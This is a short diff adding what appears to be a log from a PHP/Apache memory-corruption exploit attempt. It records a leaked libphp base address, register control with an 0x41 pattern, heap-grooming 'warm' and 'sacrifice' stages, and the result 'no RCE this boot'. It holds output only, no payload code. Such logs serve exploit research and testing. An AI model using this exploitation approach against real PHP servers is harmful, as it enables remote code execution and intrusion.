@@ -1,0 +1,18 @@
+=== oom80: AIM-arm population (safe tile) then finish ===
+    libphp base = 0x7f59c12d7000
+[1] CAL warm (11)
+  cal-fire0: 200
+  cal-fire1: ERR
+    rdi=4141414141410000 VA0=0x7f59bec01718
+    rc-check: True (0100000008010000)
+[2] AIM warm (11), target=0x7f59bec02520 free_obj=0x7f59c16728a0
+[3] AIM sacrifice + finishers (no break on crash)
+  aim-fire0 (stamp 9510000): 200
+  aim-fire1 (stamp 9510004): 200
+  aim-fire2 (stamp 9510008): 200
+  aim-fire3 (stamp 9510012): 200
+  aim-fire4 (stamp 9510016): 200
+  aim-fire5 (stamp 9510020): 200
+[RESULT] no RCE this boot
+[4] restore
+    restored: SAPI=apache2handler lim=8M vars=100000
